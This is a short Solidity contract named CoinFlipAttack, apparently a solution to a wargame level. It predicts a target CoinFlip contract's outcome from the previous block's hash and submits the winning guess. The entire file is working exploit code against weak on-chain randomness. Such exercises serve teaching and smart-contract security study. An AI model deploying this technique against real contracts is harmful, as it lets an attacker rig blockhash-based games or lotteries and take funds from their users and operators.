// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {
    
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address immutable target;

    constructor(address _target) {
        target = _target;
    }

    function attack() external {
        bool guess = predictFlip();
        CoinFlip(target).flip(guess);
    }

    function predictFlip() internal view returns (bool side) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        side = coinFlip == 1 ? true : false;
    }
}